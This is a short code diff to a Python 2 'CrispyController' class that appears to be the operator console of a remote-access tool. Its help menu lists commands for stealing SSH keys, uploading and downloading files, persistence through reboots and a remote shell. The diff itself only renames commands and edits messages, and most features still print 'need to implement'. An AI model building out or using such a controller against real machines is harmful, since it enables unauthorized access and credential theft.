@@ -21,13 +21,13 @@ class CrispyController:
             get_ssh_keys       - get any ssh keys
             download           - download [src absolute path] [dest absolute path]
             upload             - upload [src absolute path] [dest absolute path]
-            enable_persistence - make py persistent through reboots
+            persistence        - make py persistent through reboots
             search             - search for files matching a given regular expression
             shell              - drop to a shell
         Local commands:
             lcd                - change local directory
             lpwd               - print current working directory
-            session            - show info about current session
+            sessions           - list all connected sessions
             exit               - close down connection to remote host
         """
         return info
@@ -51,7 +51,6 @@ class CrispyController:
      
     def uploadFile(self, upFile):
         if os.path.isfile(upFile):
-
             with open(upFile, 'rb') as f:
                 while True:
                     data = f.read(BUFFER_SIZE)
@@ -75,7 +74,7 @@ class CrispyController:
                  
                 if cmd == '-h' or cmd == 'help':
                     print self.help_menu()
-                elif cmd == 'session':
+                elif cmd == 'sessions':
                     print "need to implement"
                 elif cmd.startswith('lcd'):
                     args = cmd.split(' ')
@@ -83,14 +82,14 @@ class CrispyController:
                     if len(args) == 2 and os.path.isdir(args[1]):
                         os.chdir(args[1])
                     else:
-                        print "[!] Usage is \"lcd /new/path\"\n"
+                        print "[!] You must use a valid path e.g >> lcd /Users/Crispy\n"
                 elif cmd == 'lpwd':
                     print "{0}\n".format(os.getcwd())
                 elif cmd.startswith("search"):
                     print "need to implement"
                 elif cmd == "shell":
                     print "need to implement"
-                elif cmd == "enable_persistence":
+                elif cmd == "persistence":
                     print "need to implement"
                 elif cmd.startswith('download'):
                     saveMeFile = cmd[9:].split(' ')[1]
